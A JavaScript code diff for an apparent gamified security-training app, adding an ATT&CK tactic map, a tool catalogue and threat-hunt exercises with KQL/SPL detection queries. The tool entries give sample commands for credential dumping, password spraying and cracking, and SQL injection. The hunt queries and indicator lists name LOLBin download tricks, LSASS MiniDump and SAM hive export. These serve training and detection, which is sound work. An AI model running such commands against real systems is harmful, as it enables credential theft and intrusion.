+{t:'Execution',c:'#ffaa00',techs:['PowerShell','WMI','Scheduled Tasks','LOLBins']},
+{t:'Persistence',c:'#c084fc',techs:['Registry Run Keys','Scheduled Tasks','Boot Autostart','Account Manipulation']},
+{t:'Privilege Escalation',c:'#ff8855',techs:['Token Impersonation','Sudo Abuse','DLL Hijacking','Process Injection']},
+{t:'Defense Evasion',c:'#00ff88',techs:['Obfuscation','LOLBins','Log Clearing','Timestomping']},
+{t:'Credential Access',c:'#ff3055',techs:['Kerberoasting','LSASS Dump','Password Spray','Brute Force']},
+{t:'Discovery',c:'#00ffff',techs:['AD Enumeration','Network Scanning','Permission Groups','Account Discovery']},
+{t:'Lateral Movement',c:'#ffaa00',techs:['Pass-the-Hash','RDP Hijack','WMI','BloodHound Paths']},
+{t:'Collection',c:'#c084fc',techs:['Data Staged','Keylogging','Screen Capture','Email Collection']},
+{t:'Command & Control',c:'#00ff88',techs:['DNS Tunneling','HTTPS Beacon','Domain Fronting','Custom Protocol']},
+{t:'Exfiltration',c:'#ff8855',techs:['HTTP/S Exfil','DNS Exfil','Cloud Storage','Encrypted Archive']},
+{t:'Impact',c:'#ff3055',techs:['Ransomware','Data Wipe','DoS','Defacement']}
+];
+const TOOLS=[
+{n:'Nmap',cat:'Recon',d:'Network scanner for host discovery, port scanning, service detection and OS fingerprinting.',cmd:'nmap -sV -sC -O -p- target.corp'},
+{n:'Metasploit',cat:'Exploitation',d:'Industry-standard exploitation framework with hundreds of attack and post-exploitation modules.',cmd:'msfconsole -q -x "use exploit/multi/handler; run"'},
+{n:'Mimikatz',cat:'Credentials',d:'Post-exploitation tool for extracting credentials, hashes, and Kerberos tickets from Windows memory.',cmd:'mimikatz # sekurlsa::logonpasswords'},
+{n:'BloodHound',cat:'Active Directory',d:'AD attack path mapper using graph theory to find shortest paths to Domain Admin.',cmd:'SharpHound.exe -c All --zipfilename output.zip'},
+{n:'CrackMapExec',cat:'Lateral Movement',d:'Swiss army knife for Windows/AD pentesting — auth testing, command execution, data enumeration.',cmd:'cme smb 192.168.1.0/24 -u admin -p password --shares'},
+{n:'Burp Suite',cat:'Web Testing',d:'Web app pentesting platform — intercepting proxy, scanner, fuzzer, intruder, and decoder.',cmd:'java -jar burpsuite_community.jar'},
+{n:'sqlmap',cat:'Web Testing',d:'Automated SQL injection detection and exploitation with full database extraction capabilities.',cmd:'sqlmap -u "http://target/page?id=1" --dbs --batch'},
+{n:'Hashcat',cat:'Passwords',d:'GPU-accelerated password recovery supporting 300+ hash formats including NTLM and Kerberos.',cmd:'hashcat -m 13100 hashes.txt rockyou.txt -r rules/best64.rule'},
+{n:'Hydra',cat:'Brute Force',d:'Fast network authentication cracker for SSH, FTP, HTTP, SMB, RDP, and 50+ protocols.',cmd:'hydra -L users.txt -P pass.txt ssh://target -t 4'},
+{n:'Wireshark',cat:'Network',d:'Packet capture and protocol analysis — essential for traffic investigation and MITM analysis.',cmd:'# Filter: http.request.method == "POST" && tcp.port == 80'},
+{n:'Volatility',cat:'Forensics',d:'Memory forensics framework for extracting processes, network connections, and malware from RAM.',cmd:'python3 vol.py -f mem.dmp windows.pslist'},
+{n:'Nuclei',cat:'Scanning',d:'Fast template-based vulnerability scanner with 8,000+ community detection templates.',cmd:'nuclei -u https://target.corp -t /nuclei-templates/ -severity critical,high'},
+{n:'ffuf',cat:'Web Fuzzing',d:'Fast web fuzzer for directory discovery, parameter fuzzing, and virtual host enumeration.',cmd:'ffuf -u http://target/FUZZ -w seclists/raft-medium-words.txt'},
+{n:'Impacket',cat:'Active Directory',d:'Python library for network protocols — DCSync, secretsdump, psexec, Kerberos attacks.',cmd:'python3 secretsdump.py corp/admin:password@dc01.corp.local'},
+{n:'Snort',cat:'Detection',d:'Open-source IDS/IPS with rule-based detection for network threats and C2 traffic patterns.',cmd:'snort -c /etc/snort/snort.conf -i eth0 -A console'},
+{n:'YARA',cat:'Malware Analysis',d:'Pattern-matching tool for identifying malware families by writing custom detection rules on files and memory.',cmd:'yara -r rules/malware.yar /path/to/scan/'},
+{n:'Zeek',cat:'Network',d:'Network analysis framework for creating high-fidelity security logs from pcap or live traffic.',cmd:'zeek -C -r capture.pcap local.zeek'},
+{n:'Falco',cat:'Container Security',d:'Cloud-native runtime security — detects anomalous container behaviour using kernel-level syscall rules.',cmd:'falco -r /etc/falco/falco_rules.yaml -o json_output=true'},
+{n:'Trivy',cat:'DevSecOps',d:'All-in-one vulnerability scanner for containers, filesystems, IaC, and SBOMs — integrates with CI/CD.',cmd:'trivy image --severity HIGH,CRITICAL myapp:latest'},
+{n:'Velociraptor',cat:'DFIR',d:'Endpoint visibility and DFIR platform for rapid artifact collection and threat hunting at scale.',cmd:'velociraptor artifacts collect Windows.KapeFiles.Targets'}
 ];
 
-const NODES={
-attacker:{l:'ATTACKER',c:'#ff0033',i:'☠',x:0.12,y:0.5},
-victim:{l:'VICTIM',c:'#ffcc00',i:'💻',x:0.88,y:0.28},
-gateway:{l:'GATEWAY',c:'#00ffff',i:'⬡',x:0.5,y:0.5},
-internet:{l:'INTERNET',c:'#333',i:'🌐',x:0.88,y:0.72},
-dns:{l:'DNS SRV',c:'#00ff41',i:'📡',x:0.5,y:0.18},
-target:{l:'TARGET',c:'#ff6600',i:'🖥',x:0.88,y:0.5},
-botnet:{l:'BOTNET',c:'#ff6600',i:'🤖',x:0.12,y:0.2},
-switch:{l:'SWITCH',c:'#00ffff',i:'⬡',x:0.5,y:0.5},
-vlan10:{l:'VLAN 10',c:'#00ff41',i:'🖥',x:0.78,y:0.22},
-vlan20:{l:'VLAN 20',c:'#ffcc00',i:'🖥',x:0.78,y:0.78},
-dhcp:{l:'DHCP SRV',c:'#00ff41',i:'📦',x:0.5,y:0.18},
-isp1:{l:'ISP-A',c:'#00ffff',i:'🔌',x:0.38,y:0.28},
-isp2:{l:'ISP-B',c:'#00ffff',i:'🔌',x:0.38,y:0.72},
-};
-
-const FLOWS={
-arp:[['attacker','gateway','#ff0033'],['attacker','victim','#ff0033'],['victim','attacker','#ffcc00']],
-dns:[['attacker','victim','#cc00ff'],['victim','dns','#00ffff'],['attacker','dns','#cc00ff']],
-syn:[['attacker','target','#ff6600'],['botnet','target','#ff6600'],['attacker','internet','#ff6600']],
-vlan:[['attacker','switch','#00ffff'],['switch','vlan10','#00ffff'],['attacker','vlan20','#ff0033']],
-dhcp:[['attacker','victim','#ffcc00'],['attacker','gateway','#ffcc00'],['victim','attacker','#ff0033']],
-bgp:[['attacker','isp1','#0066ff'],['attacker','isp2','#0066ff'],['isp1','internet','#0066ff'],['isp2','internet','#0066ff']],
-mitm:[['attacker','victim','#ff006e'],['attacker','gateway','#ff006e'],['victim','attacker','#ffcc00'],['attacker','internet','#ff006e']],
-};
-
-const cv=document.getElementById('nc'),ctx=cv.getContext('2d');
-let parts=[],fN=0,animating=false,raf=null,currentAtk=null,prog=0,pt=null;
-
-function resizeCv(){cv.width=cv.offsetWidth;cv.height=cv.offsetHeight;}
-window.addEventListener('resize',()=>{resizeCv();draw();});
-
-function npos(id){const n=NODES[id];return{x:cv.width*n.x,y:cv.height*n.y};}
-
-function drawNode(id,glow){
-  const n=NODES[id],p=npos(id),r=22;
-  ctx.save();
-  if(glow){ctx.shadowBlur=18;ctx.shadowColor=n.c;}
-  ctx.beginPath();ctx.arc(p.x,p.y,r,0,Math.PI*2);
-  ctx.fillStyle=glow?n.c+'22':'#050505';ctx.fill();
-  ctx.strokeStyle=glow?n.c:'#1a1a1a';ctx.lineWidth=glow?1.5:1;ctx.stroke();
-  ctx.restore();
-  ctx.font='12px serif';ctx.textAlign='center';ctx.textBaseline='middle';
-  ctx.fillText(n.i,p.x,p.y-1);
-  ctx.font=glow?'bold 7px "Share Tech Mono"':'7px "Share Tech Mono"';
-  ctx.fillStyle=glow?n.c:'#2a2a2a';
-  ctx.fillText(n.l,p.x,p.y+r+9);
-}
-
-function drawEdge(a,b,col,glow){
-  const pa=npos(a),pb=npos(b);
-  ctx.save();
-  if(glow){ctx.shadowBlur=6;ctx.shadowColor=col;}
-  ctx.beginPath();ctx.moveTo(pa.x,pa.y);ctx.lineTo(pb.x,pb.y);
-  ctx.strokeStyle=glow?col+'99':'#0d0d0d';ctx.lineWidth=1;ctx.stroke();
-  ctx.restore();
-}
-
-function spawnPart(a,b,col){
-  const pa=npos(a),pb=npos(b);
-  parts.push({x:pa.x,y:pa.y,tx:pb.x,ty:pb.y,t:0,spd:0.014+Math.random()*0.01,col,sz:2+Math.random()*2});
-}
-
-function draw(){
-  if(!cv.width)return;
-  ctx.clearRect(0,0,cv.width,cv.height);
-  const atk=currentAtk;
-  if(!atk){
-    ['attacker','gateway','victim','internet'].forEach((n,i,a)=>{if(i>0)drawEdge(a[0],n,'#111',false);});
-    drawEdge('gateway','internet','#111',false);
-    ['attacker','victim','gateway','internet'].forEach(n=>drawNode(n,false));
-    return;
-  }
-  const nodes=atk.nodes,flows=FLOWS[atk.flow]||[];
-  for(let i=0;i<nodes.length;i++)for(let j=i+1;j<nodes.length;j++)drawEdge(nodes[i],nodes[j],'#111',false);
-  if(animating)flows.forEach(([a,b,c])=>drawEdge(a,b,c,true));
-  if(animating&&fN%14===0){const f=flows[Math.floor(Math.random()*flows.length)];if(f)spawnPart(f[0],f[1],f[2]);}
-  parts=parts.filter(p=>p.t<1);
-  parts.forEach(p=>{
-    p.t=Math.min(1,p.t+p.spd);
-    p.x+=(p.tx-p.x)*p.spd*4;p.y+=(p.ty-p.y)*p.spd*4;
-    ctx.save();ctx.shadowBlur=10;ctx.shadowColor=p.col;
-    ctx.beginPath();ctx.arc(p.x,p.y,p.sz,0,Math.PI*2);ctx.fillStyle=p.col;ctx.fill();ctx.restore();
-  });
-  nodes.forEach(n=>drawNode(n,animating));
-  fN++;
-  if(animating)raf=requestAnimationFrame(draw);
-}
-
-function renderList(){
-  document.getElementById('atkList').innerHTML=ATTACKS.map(a=>`
-    <div class="attack-item" id="ai-${a.id}" onclick="selectAtk('${a.id}')">
-      <div class="atk-name">${a.name}</div>
-      <div class="atk-sub">${a.sub}</div>
-      <div class="tags">
-        <span class="tag tl">${a.layer}</span>
-        <span class="tag ti">IMP:${a.impact}</span>
-        <span class="tag ts">STL:${a.stealth}</span>
-      </div>
-    </div>`).join('');
-}
-
-function selectAtk(id){
-  resetLab();
-  currentAtk=ATTACKS.find(a=>a.id===id);if(!currentAtk)return;
-  document.querySelectorAll('.attack-item').forEach(e=>e.classList.remove('active'));
-  document.getElementById('ai-'+id).classList.add('active');
-  document.getElementById('launchBtn').disabled=false;
-  document.getElementById('cvLabel').textContent=`TARGET LOCKED — ${currentAtk.name.toUpperCase()}`;
-  document.getElementById('sImpact').textContent=currentAtk.impact+'/10';
-  document.getElementById('sStealth').textContent=currentAtk.stealth+'/10';
-  document.getElementById('sComplex').textContent=currentAtk.complex;
-  document.getElementById('sLayer').textContent=currentAtk.layer;
-  document.getElementById('mitreBody').innerHTML=Object.entries(currentAtk.mitre).map(([tac,techs])=>
-    `<div class="mitre-tac">${tac}</div>${techs.map(t=>`<span class="mitre-tag">${t}</span>`).join('')}`).join('');
-  document.getElementById('toolBody').innerHTML=currentAtk.tools.map(t=>
-    `<div class="tool"><div class="tool-ico">${t.i}</div><div><div class="tool-n">${t.n}</div><div class="tool-u">${t.u}</div></div></div>`).join('');
-  renderPkt(currentAtk.packets);
-  renderChain(false);
-  draw();
-  addLog('info',`[LAB] Loaded: ${currentAtk.name} — press LAUNCH to simulate`);
-}
-
-function renderPkt(pkts){
-  const d=document.getElementById('pktDisplay');
-  if(!pkts||!pkts.length){d.innerHTML='<div class="pkt-empty">// No packet data</div>';return;}
-  d.innerHTML=pkts.map(p=>{
-    const fields=Object.entries(p.fields).map(([k,v])=>
-      `  <span class="pkt-field">${k.padEnd(14,' ')} </span><span class="pkt-val">${v}</span>`).join('\n');
-    return`<span class="pkt-layer">[ ${p.layer} ]</span>\n${fields}`;
-  }).join('\n\n');
-}
-
-function renderChain(active){
-  if(!currentAtk)return;
-  document.getElementById('chainBody').innerHTML=currentAtk.phases.map((ph,pi)=>`
-    <div class="phase" id="ph-${pi}">
-      <div class="phase-label">${ph.label}</div>
-      ${ph.steps.map((s,si)=>`
-        <div class="step">
-          <div class="step-n">0${si+1}</div>
-          <div style="flex:1">
-            <div class="step-t">${s.t}</div>
-            <div class="step-d">${s.d}</div>
-            ${s.cmd?`<div class="step-cmd" onclick="copyCmd(this,\`${s.cmd.replace(/`/g,"'")}\`)">${s.cmd}</div>`:''}
-          </div>
-        </div>`).join('')}
-    </div>`).join('');
-  if(active)document.getElementById('ph-0')?.classList.add('active');
-}
-
-function copyCmd(el,cmd){
-  navigator.clipboard.writeText(cmd).then(()=>{
-    el.classList.add('copied');setTimeout(()=>el.classList.remove('copied'),1500);
+const HUNTS=[
+{id:'TH-001',name:'Suspicious Kerberos TGS Patterns',tag:'Identity Threat Hunt',pts:200,hyp:'Hypothesis: An attacker is performing Kerberoasting from a workstation to crack service account passwords offline.',datasrc:'Windows Security Event Log (EventID 4769), Domain Controller logs, SIEM',query:'// Sentinel KQL\nSecurityEvent\n| where EventID == 4769\n| where TicketEncryptionType == "0x17"\n| where ServiceName !endswith "$"\n| summarize TGS_Count=count() by AccountName, Computer, bin(TimeGenerated, 5m)\n| where TGS_Count > 5\n| order by TGS_Count desc\n\n// Splunk SPL\nindex=wineventlog EventCode=4769 TicketEncryptionType=0x17\n| where NOT ServiceName LIKE "%$"\n| stats count AS TGS_Count BY AccountName, ComputerName, _time span=5m\n| where TGS_Count > 5',iocs:['RC4-HMAC (0x17) TGS requests','More than 5 TGS requests in 5 minutes from same account','Service names not ending in $ (machine accounts are normal)','Off-hours request time (attackers often run tools after hours)'],mitre:'T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting',steps:['Review KQL output — identify accounts with >5 TGS requests in 5-min window','Check if identified accounts are expected service accounts or end-user accounts','Verify if source workstations are known pentest hosts or regular user machines','Cross-reference timestamps with working hours — 3am TGS requests are anomalous','If confirmed malicious — escalate to IR-002 Kerberoasting Playbook']},
+{id:'TH-002',name:'Living-off-the-Land Binary Abuse',tag:'Endpoint Threat Hunt',pts:225,hyp:'Hypothesis: An attacker is using signed Windows binaries (LOLBins) to evade AV and execute malicious code.',datasrc:'Sysmon EventID 1 (Process Create), EDR telemetry, PowerShell Script Block Logs',query:'// Sentinel KQL\nSecurityEvent\n| where EventID == 4688\n| where CommandLine has_any ("certutil -decode", "mshta http", "regsvr32 /s /n /i:http", "wmic process call create", "bitsadmin /transfer")\n| project TimeGenerated, Computer, Account, CommandLine, ParentProcessName\n\n// Splunk SPL\nindex=sysmon EventCode=1\n| where (CommandLine LIKE "%certutil%decode%" OR CommandLine LIKE "%mshta http%"\n       OR CommandLine LIKE "%regsvr32%http%" OR CommandLine LIKE "%bitsadmin%transfer%")\n| table _time, ComputerName, User, CommandLine, ParentImage',iocs:['certutil.exe with -decode or -urlcache flags','mshta.exe loading remote scripts (http/https)','regsvr32.exe /s /n /i:http:// (Squiblydoo technique)','wmic.exe process call create spawning shells','bitsadmin /transfer for remote file download'],mitre:'T1218 — System Binary Proxy Execution; T1105 — Ingress Tool Transfer',steps:['Run KQL/SPL query against last 7 days of endpoint logs','Identify parent process — Office apps spawning LOLBins is high severity','Check if destination URLs/IPs in commands are internal or external','Baseline — some LOLBin usage is legitimate (IT scripts, software deployment)','Unexplained LOLBin usage from user workstations during business hours = escalate']},
+{id:'TH-003',name:'Beaconing C2 Traffic Hunt',tag:'Network Threat Hunt',pts:250,hyp:'Hypothesis: A host is communicating with a C2 server using periodic beaconing with low jitter, consistent payload sizes.',datasrc:'Firewall flow logs, DNS query logs, Proxy logs, NetFlow/Zeek connection logs',query:'// Azure Sentinel — Firewall Logs\nAzureDiagnostics\n| where Category == "AzureFirewallNetworkRule"\n| where TimeGenerated > ago(24h)\n| summarize conn_count=count(), bytes_avg=avg(sentBytes_d), bytes_stdev=stdev(sentBytes_d)\n  by bin(TimeGenerated, 10m), SourceIP, DestinationIP, DestinationPort\n| where conn_count > 5 and bytes_stdev < 200\n| order by bytes_stdev asc\n\n// Zeek conn.log\nzcat conn.log.gz | zeek-cut id.orig_h id.resp_h id.resp_p duration orig_bytes\n| awk "$4 > 0" | sort -k1,2 | uniq -c | sort -rn',iocs:['Consistent connection intervals (every 30/60/300 seconds ± <10%)','Consistent payload sizes (±100 bytes per beacon)','Destination IP with no hostname or self-signed TLS cert','Beaconing from unexpected processes (svchost, explorer.exe)','Low-entropy domain names or IP-only destinations'],mitre:'T1071 — Application Layer Protocol C2; T1102 — Web Service as C2',steps:['Run flow analysis query against 24-48 hour window — look for near-zero stdev in bytes','Identify hosts with >10 connections to same external IP with low byte variation','Resolve destination IPs — young domains, hosting providers, Tor nodes = suspicious','Check TLS certificate details — self-signed, short validity = red flag','Identify process making connections via EDR — system processes with C2 patterns = escalate']},
+{id:'TH-004',name:'Credential Dumping Activity',tag:'Endpoint Threat Hunt',pts:275,hyp:'Hypothesis: An attacker has established a foothold and is attempting to dump credentials from LSASS memory or SAM database.',datasrc:'Sysmon EventID 10 (Process Access), Windows Security Event 4656, EDR memory telemetry',query:'// Sentinel — LSASS Access\nSecurityEvent\n| where EventID == 4656\n| where ObjectName contains "lsass"\n| where AccessMask in ("0x1010", "0x1410", "0x143a")\n| project TimeGenerated, Computer, Account, ProcessName, AccessMask\n\n// Sysmon Event 10 — Process Access\nindex=sysmon EventCode=10 TargetImage="*lsass.exe"\n| where NOT (SourceImage IN ("*MsMpEng.exe","*csrss.exe","*wininit.exe","*svchost.exe"))\n| table _time, Computer, SourceImage, TargetImage, GrantedAccess',iocs:['Unexpected process accessing lsass.exe (non-AV, non-system)','AccessMask 0x1010 or 0x143a on lsass — memory read + DupHandle','procdump.exe, mimikatz.exe, comsvcs.dll MiniDump in command line','Shadow copy access patterns on SAM/SYSTEM/SECURITY hives','Event ID 4688: reg.exe save HKLM\\SAM'],mitre:'T1003.001 — LSASS Memory Dumping; T1003.002 — SAM Database',steps:['Query Sysmon Event 10 for non-system processes targeting lsass.exe','Filter known-good processes (AV, EDR, OS processes)','Check AccessMask — 0x1010 (PROCESS_VM_READ) is the key read flag','Look for comsvcs.dll usage: rundll32 comsvcs.dll MiniDump <PID> — very common attacker technique','Cross-reference with any new files created at same time (*.dmp, *.dat) — escalate immediately']},
+{id:'TH-005',name:'Persistence via Scheduled Tasks',tag:'Persistence Threat Hunt',pts:200,hyp:'Hypothesis: An attacker has established persistence using scheduled tasks pointing to external URLs or unusual binary paths.',datasrc:'Sysmon EventID 1 + 11, Windows Event 4698 (Task Created), Task Scheduler logs',query:'// Task creation — Event 4698\nSecurityEvent\n| where EventID == 4698\n| extend TaskXML = tostring(EventData)\n| where TaskXML has_any ("http://", "https://", "powershell", "cmd /c", "wscript", "regsvr32", "rundll32", "mshta")\n| project TimeGenerated, Computer, Account, TaskName=extract(\"<URI>(.*?)</URI>\", 1, TaskXML), TaskXML\n\n// List all scheduled tasks via EDR hunt\nindex=sysmon EventCode=1 Image="*schtasks.exe"\n| where CommandLine LIKE "%/create%"\n| rex field=CommandLine "/tr (?<action>[^ ]+)"\n| where action LIKE "%http%"',iocs:['Scheduled task running PowerShell with encoded command (-enc)','Task action pointing to HTTP/HTTPS URL or temp directory','Task created by non-admin account or at odd hours','Task name mimicking legitimate Windows tasks (e.g. MicrosoftEdgeUpdate vs EdgeUpdate)','Base64-encoded command in task action field'],mitre:'T1053.005 — Scheduled Task/Job: Scheduled Task',steps:['Run Event 4698 query across all DCs and workstations for last 30 days','Filter for task actions containing LOLBins, HTTP, or encoded PowerShell','Compare task names against baseline — any new or renamed tasks since last known good','Check task author and creation time — midnight or weekend task creation = suspicious','Export full task XML for any suspicious entries and submit to malware sandbox']
+}];
+const ST_HUNT={hunts:JSON.parse(localStorage.getItem('nk3_hunts')||'{}')};
+function saveHunt(){localStorage.setItem('nk3_hunts',JSON.stringify(ST_HUNT.hunts));}
+function huntXP(){return Object.values(ST_HUNT.hunts).reduce((a,v)=>a+v.length*15,0);}
+function renderHunt(){
+  document.getElementById('huntGrid').innerHTML=HUNTS.map(function(h){
+    const done=(ST_HUNT.hunts[h.id]||[]).length;
+    const total=h.steps.length;
+    const complete=done>=total;
+    const card=document.createElement('div');
+    return '<div class="hunt-card'+(complete?' hunted':'')+'" data-hid="'+h.id+'">'
+      +'<div class="hunt-tag">'+h.tag+'</div>'
+      +'<div class="hunt-name">'+h.id+' — '+h.name+'</div>'
+      +'<div class="hunt-hyp">'+h.hyp+'</div>'
+      +'<div class="hunt-foot"><span class="hunt-pts">◈ '+h.pts+' XP</span>'
+      +'<span style="font-size:10px;font-family:var(--fm);color:'+(complete?'var(--green)':'var(--text3)')+'">'+done+'/'+total+' steps'+(complete?' ✓':' ○')+'</span></div></div>';
+  }).join('');
+  document.getElementById('huntGrid').querySelectorAll('.hunt-card').forEach(function(card){
+    card.onclick=function(){openHunt(this.dataset.hid);};
   });
 }
 
-function launchAttack(){
-  if(!currentAtk||animating)return;
-  animating=true;parts=[];prog=0;
-  document.getElementById('launchBtn').disabled=true;
-  document.getElementById('cvLabel').textContent=`▶ ATTACKING — ${currentAtk.name.toUpperCase()}`;
-  renderChain(true);
-  const fill=document.getElementById('progFill'),pct=document.getElementById('progPct');
-  const logs=currentAtk.detLogs;
-  pt=setInterval(()=>{
-    prog=Math.min(100,prog+1.0);
-    fill.style.width=prog+'%';pct.textContent=Math.round(prog)+'%';
-    [0,25,55,80].forEach((th,i)=>{
-      if(prog>=th){
-        const el=document.getElementById('ph-'+i);
-        if(el&&!el.classList.contains('active')&&!el.classList.contains('done')){
-          el.classList.add('active');
-          if(i>0){const prev=document.getElementById('ph-'+(i-1));if(prev){prev.classList.remove('active');prev.classList.add('done');}}
-        }
-      }
-    });
-    if(prog>=25&&prog<27)addLog(logs[0].t,logs[0].m);
-    if(prog>=50&&prog<52)addLog(logs[1]?.t,logs[1]?.m);
-    if(prog>=75&&prog<77)addLog(logs[2]?.t,logs[2]?.m);
-    if(prog>=92&&prog<94)addLog(logs[3]?.t,logs[3]?.m);
-    if(prog>=100){
-      clearInterval(pt);
-      setTimeout(()=>{
-        animating=false;cancelAnimationFrame(raf);
-        document.getElementById('cvLabel').textContent=`✓ COMPLETE — ${currentAtk.name.toUpperCase()}`;
-        document.getElementById('launchBtn').disabled=false;
-        draw();addLog('stealth','[LAB] Simulation complete — review kill chain above');
-      },600);
-    }
-  },55);
-  draw();
+function openHunt(id){
+  const h=HUNTS.find(function(x){return x.id===id;});
+  if(!h)return;
+  const checks=ST_HUNT.hunts[h.id]||[];
+  document.getElementById('modal').classList.add('open');
+  const iocList=h.iocs.map(function(i){return'<li>'+i+'</li>';}).join('');
+  const stepList=h.steps.map(function(step,si){
+    const key=h.id+'-'+si;
+    const ck=checks.includes(key);
+    return '<li class="'+(ck?'ck':'')+'" data-hid="'+h.id+'" data-si="'+si+'" data-key="'+key+'">'+step+'</li>';
+  }).join('');
+  document.getElementById('modalBody').innerHTML=
+    '<div class="m-type" style="color:var(--green)">THREAT HUNT EXERCISE</div>'
+    +'<div class="m-title">'+h.name+'</div>'
+    +'<div class="hunt-steps-modal">'
+    +'<div class="hunt-step-block"><div class="hunt-step-lbl">\uD83D\uDCCC Hypothesis</div><div class="hunt-step-body">'+h.hyp+'</div></div>'
+    +'<div class="hunt-step-block"><div class="hunt-step-lbl">\uD83D\uDCCA Data Sources</div><div class="hunt-step-body">'+h.datasrc+'</div></div>'
+    +'<div class="hunt-step-block"><div class="hunt-step-lbl">\uD83D\uDD0E Hunt Queries (KQL / SPL)</div><div class="hunt-query">'+h.query+'</div></div>'
+    +'<div class="hunt-step-block"><div class="hunt-step-lbl">\uD83D\uDEA8 Expected IOCs</div><ul class="ir-cl">'+iocList+'</ul></div>'
+    +'<div class="hunt-step-block"><div class="hunt-step-lbl">\uD83C\uDFAF MITRE ATT&CK</div><div class="hunt-step-body" style="color:var(--cyan)">'+h.mitre+'</div></div>'
+    +'<div class="hunt-step-block"><div class="hunt-step-lbl">\u2705 Hunt Steps \u2014 Check Off as You Work</div>'
+    +'<ul class="hunt-cl">'+stepList+'</ul></div>'
+    +'</div>';
+  document.getElementById('modal').querySelectorAll('.hunt-cl li[data-hid]').forEach(function(li){
+    li.onclick=function(){toggleHuntStep(this.dataset.hid,parseInt(this.dataset.si),this.dataset.key,this);};
+  });
 }
 
-function resetLab(){
-  animating=false;cancelAnimationFrame(raf);clearInterval(pt);parts=[];prog=0;
-  document.getElementById('progFill').style.width='0%';
-  document.getElementById('progPct').textContent='0%';
-  document.getElementById('launchBtn').disabled=true;
-  document.getElementById('cvLabel').textContent='SELECT AN ATTACK TO BEGIN';
-  document.getElementById('chainBody').innerHTML=`<div class="welcome"><div class="w-arrow">←</div><h2>SELECT AN ATTACK</h2><p>Choose a network attack to see the full attacker kill chain.</p></div>`;
-  document.getElementById('pktDisplay').innerHTML='<div class="pkt-empty">// Select an attack to see real packet structure</div>';
-  document.getElementById('sImpact').textContent='—';document.getElementById('sStealth').textContent='—';
-  document.getElementById('sComplex').textContent='—';document.getElementById('sLayer').textContent='—';
-  document.getElementById('mitreBody').innerHTML='<span style="font-family:var(--mono);font-size:0.62rem;color:#1a1a1a">Select an attack...</span>';
-  document.getElementById('toolBody').innerHTML='<span style="font-family:var(--mono);font-size:0.62rem;color:#1a1a1a">No attack selected...</span>';
-  document.querySelectorAll('.attack-item').forEach(e=>e.classList.remove('active'));
-  currentAtk=null;draw();
+function toggleHuntStep(hid,si,key,el){
+  if(!ST_HUNT.hunts[hid])ST_HUNT.hunts[hid]=[];
+  const idx=ST_HUNT.hunts[hid].indexOf(key);
+  if(idx>-1)ST_HUNT.hunts[hid].splice(idx,1);
+  else ST_HUNT.hunts[hid].push(key);
+  saveHunt();renderHunt();renderDash();
+  el.classList.toggle('ck');
+  const h=HUNTS.find(x=>x.id===hid);
+  if(h&&ST_HUNT.hunts[hid].length>=h.steps.length)showToast('Hunt complete! +'+h.pts+' XP','success');
+  else showToast(el.classList.contains('ck')?'Step completed +15 XP':'Step unchecked','info');
+}
+const ST={done:JSON.parse(localStorage.getItem('nk2_done')||'[]'),solved:JSON.parse(localStorage.getItem('nk2_solved')||'[]'),irChecks:JSON.parse(localStorage.getItem('nk2_ir')||'{}'),tactic:'all',search:''};
+function save(){localStorage.setItem('nk2_done',JSON.stringify(ST.done));localStorage.setItem('nk2_solved',JSON.stringify(ST.solved));localStorage.setItem('nk2_ir',JSON.stringify(ST.irChecks));}
+const RANKS=[{n:'Recruit',xp:0},{n:'Analyst I',xp:500},{n:'Analyst II',xp:1200},{n:'Specialist',xp:2500},{n:'Operator',xp:4500},{n:'Red Teamer',xp:7000},{n:'Elite Hacker',xp:10000}];
+function totalXP(){const sx=ST.done.length*200;const cx=ST.solved.reduce((a,id)=>{const c=CHALS.find(x=>x.id===id);return a+(c?c.pts:0);},0);const irx=Object.values(ST.irChecks).reduce((a,v)=>a+v.length*10,0);const hx=huntXP();return sx+cx+irx+hx;}
+function getRank(xp){let r=RANKS[0];RANKS.forEach(x=>{if(xp>=x.xp)r=x;});return r;}
+function getNext(xp){for(const r of RANKS)if(xp<r.xp)return r;return null;}
+function renderDash(){
+  const huntDone=HUNTS.filter(h=>(ST_HUNT.hunts[h.id]||[]).length>=h.steps.length).length;
+  if(document.getElementById('s5'))document.getElementById('s5').textContent=huntDone;
+  const xp=totalXP(),rank=getRank(xp),next=getNext(xp);
+  const irDone=Object.values(ST.irChecks).reduce((a,v)=>a+v.length,0);
+  document.getElementById('s1').textContent=ST.done.length;
+  document.getElementById('s2').textContent=ST.solved.length;
+  document.getElementById('s3').textContent=irDone;
+  document.getElementById('s4').textContent=xp;
+  document.getElementById('rankPill').textContent=rank.n.toUpperCase();
+  document.getElementById('xpLvl').textContent=RANKS.indexOf(rank)+1;
+  document.getElementById('xpRank').textContent=rank.n;
+  document.getElementById('topXpTxt').textContent=xp+' XP';
+  document.getElementById('dashDate').textContent=new Date().toLocaleDateString('en-GB',{weekday:'long',year:'numeric',month:'long',day:'numeric'});
+  if(next){const pct=Math.round(((xp-rank.xp)/(next.xp-rank.xp))*100);document.getElementById('xpMainFill').style.width=pct+'%';document.getElementById('topXpFill').style.width=pct+'%';document.getElementById('xpNextTxt').textContent=xp+' / '+next.xp+' XP to '+next.n;document.getElementById('nextRN').textContent=next.n;}
+  else{document.getElementById('xpMainFill').style.width='100%';document.getElementById('topXpFill').style.width='100%';document.getElementById('xpNextTxt').textContent='Max Rank Achieved';}
+  const inc=SCEN.filter(s=>!ST.done.includes(s.id)).slice(0,4);
+  document.getElementById('recMissions').innerHTML=inc.map(s=>'<div class="quick-row" onclick="openScenById(\''+s.id+'\')"><span class="qr-name">'+s.id+' · '+s.name+'</span><span class="stars d'+s.diff+'">'+'★'.repeat(s.diff)+'☆'.repeat(5-s.diff)+'</span></div>').join('');
+}
+function renderScen(){
+  let data=SCEN;
+  if(ST.tactic!=='all')data=data.filter(s=>s.tactics.includes(ST.tactic));
+  if(ST.search){const q=ST.search.toLowerCase();data=data.filter(s=>s.name.toLowerCase().includes(q)||s.desc.toLowerCase().includes(q)||s.tools.some(t=>t.toLowerCase().includes(q)));}
